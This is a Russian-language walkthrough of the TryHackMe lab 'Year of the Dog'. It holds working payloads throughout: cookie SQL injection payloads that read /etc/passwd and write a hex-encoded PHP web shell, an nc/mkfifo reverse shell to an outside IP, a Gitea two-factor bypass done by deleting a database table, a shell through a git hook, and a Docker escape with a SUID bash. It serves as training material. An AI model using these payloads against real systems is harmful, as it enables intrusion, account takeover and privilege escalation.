# Year of the dog

:white_check_mark:  [**Cookie SQL injection**](#Cookie_SQL_injection)

:white_check_mark:  [**SQL injection with read/create file**](#SQL_injection)

:white_check_mark:  [**Php command exploit**](#Php_command_exploit)

:white_check_mark:  [**Socat tunneling**](#Socat_tunneling)

:white_check_mark:  [**Gitea 2FA bypass by database**](#Gitea_2FA_bypass)

:white_check_mark:  [**Python SQLite**](#Python_SQLite)

:white_check_mark:  [**Gitea Git Hooks shell**](#Gitea_Git_Hooks_shell)

:white_check_mark: [**Docker escape - bash**](#Docker_escape_bash)

___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV dog.thm
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Canis Queue
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<a name="Cookie_SQL_injection"></a>

Главная страница **dog.thm**:

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/1.png)

Сканирование с помощью gobuster и nikto не дали результатов. Просмотрим cookie сайта.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/2.png)

Попробовав изменить value мы получаем ошибку.

<a name="SQL_injection"></a>

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/3.png)

Скорее всего приложение берет данные о месте в очереди из базы данных. Проверим приложение на наличие SQL иньекции, подставив **'** в конце value. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/4.png)

Получаем сообщение о том, что был нарушен синтаксис SQL, значит приложение уязвимо к SQL иньекции. Перехватим запрос с помощью Burp Suite и отправим в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/5.png)

Для начала узнаем количество столбцов в таблице подставляя значения null.
```
405'union+select+null-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/6.png)

Видим, что в таблице больше столбцов, подставляем еще одно значение null.
```
405'union+select+null,null-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/7.png)

Затем проверяем какой тип данных могут принимать столбцы.
```
405'union+select+'a','a'-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/8.png)

Узнав тип данных, следует понять, какая база данных используется. Для этого мы будет отпроавлять запрос на вывод версии.
```
405'union+select+null,@@version-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/9.png)

Так как мы получили ответ от приложения, значит мы имеем представление, что это база данных Microsoft или MySQL. Далее узнаем какие таблицы содердит база данных.
```
405'union+select+null,table_name+from+information_schema.tables-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/10.png)

Получив ответ от приложения, мы видим, что в базе данных содержится всего одна таблица под названием "queue". Скорее всего в этой таблице содержится только наш номер в очереди и это не даст нам больше никаких данных. Проверим, можем ли мы читать файлы используя SQL иньекцию. Отправим слеующий запрос.
```
405'union+select+null,load_file('/etc/passwd')-- -
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/11.png)

Получив ответ, мы видим, что нам вывелось содержимое файла /etc/passwd. Возможно мы также имеем права на запись.
```
405'union+select+null,'1' into outfile '/var/www/html/shell.php-- -
```

<a name="Php_command_exploit"></a>

Отправив запрос, можно перейти в поисковой строке к этому файлу и увидеть записанную нами единицу. Запишем в файл php код для использования команд:
```
405'union+select+null,'<?php system($_GET['cmd']) ?> into outfile '/var/www/html/shell.php'-- - 
```

Отправив этот запрос мы получим следующее сообщение: "RCE Attempt detected". Приложение не дает нам отправить этот запрос, значит попробуем его заодировать в hex и отправить снова.
```
405'union+select+null,unhex('273c3f7068702073797374656d28245f4745545b27636d64275d29203f3e') into outfile '/var/www/html/shell.php'
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/12.png)

В ответе мы получаем ошибку, значит наш запрос обработался. Перейдем снова к сайту и обратимся к нашему параметру.
```
http://dog.thm/shell1.php?cmd=whoami
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/13.png)

В ответе мы получили текущего пользователя, значит теперь мы может получить обратную оболочку. Запускаем слушатель и прописываем следующую команду. Получаем оболочку.
```
curl -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.61.235 3333 >/tmp/f' http://dog.thm/shell.php
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/14.png)

Стабилизируем оболочку. В домашней директории находим пользователя **dylan**. В его директории находим первый флаг, но увы, мы не имеем к нему доступа. Однако в этой же директории есть файл **work_analysis.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/15.png)

Похоже, что кто-то брутил ssh. Возможно в этой файле мы найдем данные от пользователя dylan.
```
grep 'dylan' work_analysis
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/16.png)

Получаем пароль от пользователя dylan. Попробовав просмотреть права командой **sudo -l**, мы получаем отказ в оступе. В crontab также нет ничего полезного. Попробуем просмотреть локальные порты.
```
ss -at
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/17.png)

<a name="Socat_tunneling"></a>

Видим неизвестный порт 3000. Закинем бинарник socat на машину, чтобы перенаправить порт. Для перенаправления используем следующую команду.
```
./socat tcp-l:4444,fork,reuseaddr tcp:localhost:3000
```

Перейдем по url **dog.thm:4444**. Перед нами главная страница **Gitea**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/18.png)

Попробуем залогиниться с имеющимися данными пользователя dylan.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/19.png)

<a name="Gitea_2FA_bypass"></a>

Но затем нас встречает страница двухфакторной верификации.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/20.png)

Просмотрев файлы на машине, можно найти директорию gitea. В директории **/gitea/gitea** находим файл **gitea.db**. Это база данных SQLite 3.x. На машине не установлен SQLite, поэтому отправим файл на свою машину для анализа.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/21.png)

Просмотрев таблицы можно найти таблицу **user**. В ней находятся данные о пользователях. Это не дает нам никаких данных.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/22.png)

Так же можно обнаружить таблицу **two_factor**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/23.png)

<a name="Python_SQLite"></a>

На машине нет SQLite, но мы можем импортировать модуль в питоне и удалить эту таблицу.
```
python3

import sqlite3
sql=sqlite3.connect("gitea.db")
sql.execute("delete from two_factor")
sql.commit()
sql.close()
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/24.png)

<a name="Gitea_Git_Hooks_shell"></a>

Теперь снова перенаправляем порт и логинимся в gitea.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/25.png)

Перейдем к репозиторию **Dylan/Test-Repo**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/26.png)

Откроем настройки репозитория(Settings).

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/27.png)

Перейдем в Git Hooks.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/28.png)

Отредактируем pre-receive. Добавим в конец файла команду для получения обратной оболочки. 
 
![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/29.png)

На атакуемой машине нужно загрузить репозиторий, чтобы выполнилась наша команда, поэтому изменим README.md, закоммитим его и выгрузим.
```
git clone http://localhost:3000/Dylan/Test-Repo

echo "something" >> README.md

git add README.md

git commit -m "shell"

git push
```

Получаем обратную оболочку. Проверим права командой **sudo -l**. Мы имеем доступ к выполнению всех команд, поэтому возьмем себе рута командой **sudo su**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/30.png)

<a name="Docker_escape_bash"></a>

Проверив директорию рут, мы не найдем там файла root.txt. Это потому, что мы находимся в докере. Просмотрев директории, можно найти директорию **/data** в которой файлы аналогичны файлам на основной атакуемой машине. 

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/31.png)

Создав любой файл в этой директории в докере, он появится и на основной атакуемой машине. Поэтому настроим веб-сервер и загрузим копию **bash** с хоста. Затем установим для него бит SUID и доступность для всех.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/32.png)

Загружаем bash на докер и выдаем ему права.

```
wget 10.10.116.204:1234/bin/bash -O /data/bash

chmod 4755 bash
```

Для получения рута используем следующую команду.

```
./bash -p
```

Здесь мы используем команду **./bash -p**, потому что, при использовании фалаг **-p**, bash выполняется с эффективным идентификатором пользователя, с которым он запускается - это dylan, а не пользователь, для которого установлен бит suid, в нашем случае это root.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Year_of_the_Dog/33.png)
